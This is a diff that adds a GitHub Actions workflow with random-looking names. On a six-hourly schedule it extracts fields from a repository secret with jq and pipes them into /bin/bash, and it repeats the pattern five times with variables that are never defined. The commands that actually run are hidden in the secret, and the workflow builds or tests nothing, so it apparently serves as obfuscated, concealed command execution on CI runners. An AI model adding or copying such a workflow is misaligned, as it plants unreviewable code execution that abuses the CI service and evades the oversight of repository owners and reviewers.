@@ -1,0 +1,22 @@
+name: articulatepeanuts
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: articulatepeanuts
+        env:
+          thyqx732: ${{ secrets.thyqx732 }}
+        run: |
+          echo $thyqx732 | jq -r .c8 | /bin/bash
+          echo $d955 | jq -r .auo211 | /bin/bash
+          echo $x33646 | jq -r .p482 | /bin/bash
+          echo $oq42008 | jq -r .ixufb3 | /bin/bash
+          echo $vr5 | jq -r .y7 | /bin/bash
+          echo $sirxx19 | jq -r .lvrk1136 | /bin/bash
+
